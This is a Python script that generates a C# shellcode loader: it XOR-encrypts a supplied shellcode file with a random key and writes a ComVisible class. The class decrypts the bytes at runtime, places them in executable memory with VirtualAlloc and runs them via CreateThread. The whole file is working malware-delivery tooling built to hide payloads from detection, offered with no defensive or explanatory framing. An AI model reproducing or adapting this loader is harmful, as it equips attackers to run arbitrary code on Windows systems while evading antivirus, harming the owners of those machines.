import sys
import random

def xor_encrypt(data, key):
    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])

def generate_key(length):
    return bytearray(random.getrandbits(8) for _ in range(length))

def create_cs_file(shellcode, key, output_file):
    key_str = ', '.join(f'0x{byte:02x}' for byte in key)
    cs_template = f"""using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {{
        byte[] buf = new byte[{len(shellcode)}] {{
            {', '.join(f'0x{byte:02x}' for byte in shellcode)}
        }};

        byte[] key = new byte[{len(key)}] {{
            {key_str}
        }};

        for (int i = 0; i < buf.Length; i++) {{
            buf[i] ^= key[i % key.Length];
        }}

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, buf.Length);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }}
}}
"""
    with open(output_file, 'w') as f:
        f.write(cs_template)

def main(shellcode_file):
    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()

    key_length = 16  # Puedes ajustar el tamaño de la clave según sea necesario
    key = generate_key(key_length)
    encrypted_shellcode = xor_encrypt(shellcode, key)
    
    cs_output = 'ExampleAssembly.cs'
    create_cs_file(encrypted_shellcode, key, cs_output)
    print(f"Generated {cs_output} from {shellcode_file} using key {key.hex()}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <shellcode.bin>")
        sys.exit(1)

    shellcode_file = sys.argv[1]
    main(shellcode_file)
